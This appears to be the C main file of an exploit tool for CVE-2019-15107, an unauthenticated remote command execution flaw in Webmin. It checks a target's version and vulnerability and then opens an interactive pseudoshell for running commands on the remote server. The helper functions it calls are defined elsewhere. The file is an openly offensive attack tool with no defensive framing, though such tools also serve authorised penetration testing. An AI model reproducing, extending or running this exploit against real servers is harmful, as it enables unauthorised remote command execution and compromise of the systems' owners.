#include <stdio.h>
#include <stdlib.h>
#include "../headers/CURL.h"

int main(int argc, char *argv[])
{
    if (argc !=2)
    {
        fprintf(stdout,"[+] Usage: %s [URI] \n",argv[0]);
        return -1;
    }
    signal(SIGINT, SIGNINT_HANDLER);
    INIT_SERVER(&SERVER, argv[1]);
    fprintf(stdout,"[+] " GREEN("CVE-2019-15107") " Webmin Unauhenticated Remote Command Execution\n");
    fprintf(stdout,"[+] Target URI: " CYAN("%s") "\n",argv[1]);

    fprintf(stdout,"\n======" MAGENTA("Headers") "======\n");

    CHECK_VERSION();       
    if(SERVER.SSL_FLAG==1)
    {
        fprintf(stdout, "[~] The Given Server Is Running In " YELLOW("SSL MODE" "\n"));
        fprintf(stdout, "[+] Switching To " CYAN("SSL\n"));
        SWITCH_TO_SSL();
    }
    if(SERVER.VERSION_FLAG==1)
    {
        fprintf(stdout, "[+] The Given Server Might Be Vulnerable To " RED("CVE-2019-15107" "\n"));
    }
    else 
    {
        fprintf(stdout, "[+] The Given Server Might Not Be Vulnerable To " RED("CVE-2019-15107" "\n"));
        CLEANUP();    
        exit(EXIT_FAILURE);
    }

    CHECK_VULN();
    if(SERVER.VULN_FLAG==1)
    {
        fprintf(stdout,"[+] The Given Server " RED("IS VULNERABLE ") "To " MAGENTA("CVE-2019-15107") "\n");
    }
    else
    {
        char ch;
        fprintf(stderr,"[-] The Given Server Might not be Vulnerable To " MAGENTA("CVE-2019-15107") "\n");
        fprintf(stdout,"[~] Continue?[y/N]: ");
        ch=getchar();

        if((int)ch != 89 && (int)ch != 121)
        {
            fprintf(stderr,"[-] " RED("Exiting") "\n");
            CLEANUP();    
            exit(EXIT_FAILURE);
        }

    }

    fprintf(stdout,"[+] Starting " GREEN("Pseudoshell")"\n");
    fprintf(stdout,"[+] Maximum Command Length(CMD_SIZE) Is Set To: " CYAN("%d") "\n",CMD_SIZE);
    fprintf(stdout,"[+] To Exit: type " RED("exit()") " or hit " RED("Ctrl+C") "\n\n");
    PSEUDO_SHELL();
    CLEANUP();    
    fprintf(stdout,"[+] " GREEN("See ya!")"\n");
    return 0;
}
